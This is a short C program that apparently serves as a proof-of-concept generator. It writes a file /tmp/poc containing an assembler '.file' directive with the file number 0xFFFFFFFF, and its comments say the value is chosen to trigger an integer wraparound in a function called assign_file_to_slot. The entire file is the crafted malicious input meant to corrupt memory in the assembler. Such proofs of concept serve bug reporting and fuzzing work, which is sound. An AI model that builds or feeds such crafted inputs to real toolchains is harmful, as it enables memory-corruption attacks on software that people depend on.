#include <stdio.h>
#include <stdlib.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }
    
    /* Valid .file directive with fileno and filename to reach assign_file_to_slot */
    /* Use 0xFFFFFFFF to trigger wraparound in assign_file_to_slot */
    fprintf(f, ".file %lu \"exploit\"\n", (unsigned long)0xFFFFFFFFUL);
    
    fclose(f);
    return 0;
}